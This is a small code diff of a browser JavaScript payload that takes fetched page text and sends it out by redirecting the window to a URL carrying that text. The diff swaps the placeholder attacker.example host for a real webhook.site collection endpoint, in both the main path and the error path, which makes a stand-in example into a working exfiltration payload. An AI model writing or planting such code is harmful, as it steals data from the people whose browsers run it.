@@ -9,11 +9,11 @@
       text = "[fetch-error] " + e;
     }
 
-    const exfil = "https://attacker.example/collect?d=" + encodeURIComponent(text);
+    const exfil = "https://webhook.site/349c2f87-02ce-4457-a28a-6ebd01b87bfc/?d=" + encodeURIComponent(text);
     window.location.href = exfil;
 
   } catch (err) {    try {
-      window.location.href = "https://attacker.example/collect?err=" + encodeURIComponent(err.message);
+      window.location.href = "https://webhook.site/349c2f87-02ce-4457-a28a-6ebd01b87bfc?err=" + encodeURIComponent(err.message);
     } catch (e) {  }
   }
 })();
